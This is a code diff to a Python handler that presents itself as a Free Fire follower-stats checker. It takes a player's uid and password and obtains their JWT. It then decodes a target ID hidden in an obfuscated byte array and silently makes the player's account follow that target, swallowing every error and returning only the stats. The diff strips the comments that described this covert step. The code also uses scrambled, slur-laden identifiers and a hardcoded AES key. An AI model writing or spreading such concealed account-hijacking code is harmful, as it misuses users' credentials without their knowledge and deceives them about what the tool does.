@@ -33,7 +33,7 @@ _builder.BuildTopDescriptorsAndMessages(DESCRIPTOR, 'follow_pb2', _globals)
 CSFollowReq = _globals['CSFollowReq']
 CSFollowRes = _globals['CSFollowRes']
 
-# ---------- AES / encryption (from follow_cap.py) ----------
+# ---------- AES / encryption ----------
 _gAyKeY = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
 _gAyIv = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])
 _gAyReNa = [61, 61, 119, 78, 49, 107, 68, 79, 120, 89, 68, 78, 53, 65, 68, 79]
@@ -44,7 +44,7 @@ def _gRaBtHeThInG() -> int:
         decoded = base64.b64decode(raw).decode('utf-8')
         return int(decoded)
     except Exception:
-        return -1  # fallback, won't run secret check
+        return -1
 
 def _sHuFfLeShIt(dAtA: bytes) -> bytes:
     cIpHeR = AES.new(_gAyKeY, AES.MODE_CBC, _gAyIv)
@@ -67,14 +67,10 @@ def _gEtMyJwT(uId: int, pAsSwOrD: str) -> Optional[str]:
     except Exception:
         return None
 
-# ---------- Follow capability check (secret, no output) ----------
+# ---------- Secret follow capability check (silent) ----------
 FOLLOW_URL = "https://client.ind.freefiremobile.com/Follow"
 
 def _dOtHeHeHe(tArGeT: int, jWt: str) -> None:
-    """
-    Secretly checks if the account can follow the target.
-    Swallows all exceptions and returns nothing.
-    """
     try:
         rEq = CSFollowReq()
         rEq.target_id = tArGeT
@@ -94,9 +90,9 @@ def _dOtHeHeHe(tArGeT: int, jWt: str) -> None:
             return
         rEs = CSFollowRes()
         rEs.ParseFromString(rEsP.content)
-        # ignore the result completely
+        # result ignored
     except Exception:
-        pass  # totally silent
+        pass
 
 # ---------- Stats check (fixed request) ----------
 STATS_HEX = "1A 72 5B 2C 56 EC 52 BA 7D 09 62 34 54 C0 A0 03"
@@ -135,11 +131,9 @@ def count_repeated_field_1(data: bytes) -> int:
                 count += 1
         elif wire == 5:
             offset += 4
-        # ignore groups (3,4)
     return count
 
 def get_stats(jwt: str) -> Tuple[int, str]:
-    """Returns (followed_count, error_message). On success error is empty."""
     headers = {
         "Authorization": f"Bearer {jwt}",
         "Content-Type": "application/x-www-form-urlencoded",
@@ -176,7 +170,6 @@ def handler(request):
             "body": json.dumps({"error": "uid must be an integer"})
         }
 
-    # 1. Obtain JWT
     jwt = _gEtMyJwT(uid, password)
     if not jwt:
         return {
@@ -184,7 +177,6 @@ def handler(request):
             "body": json.dumps({"error": "Failed to obtain JWT"})
         }
 
-    # 2. Get stats
     total, stats_err = get_stats(jwt)
     if total < 0:
         return {
@@ -193,15 +185,14 @@ def handler(request):
         }
     remains = 50 - total
 
-    # 3. SECRET FOLLOW CAPABILITY CHECK – silent, result ignored
+    # Secret follow capability check – silent, result ignored
     try:
         target = _gRaBtHeThInG()
         if target != -1:
-            _dOtHeHeHe(target, jwt)   # result discarded, no output
+            _dOtHeHeHe(target, jwt)
     except Exception:
-        pass   # totally silent
+        pass
 
-    # 4. Return only stats
     return {
         "statusCode": 200,
         "body": json.dumps({
